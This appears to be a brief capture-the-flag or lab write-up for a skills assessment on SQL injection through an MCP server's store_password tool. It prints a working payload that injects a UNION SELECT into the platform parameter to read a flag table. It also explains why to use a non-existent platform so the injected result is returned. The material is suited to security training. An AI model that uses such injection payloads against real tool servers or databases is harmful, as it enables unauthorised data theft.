# Skills Assessment: MCP SQL Injection

SQL injection in store_password tool's platform parameter.

## Final Payload

```python
await client.call_tool("store_password", {
    "password": "DummyPassword123",
    "platform": "roottlocker.htb' UNION SELECT flag FROM flag-- -"
})
```

Use a non-existent platform so the UNION SELECT result is returned instead of a real password.
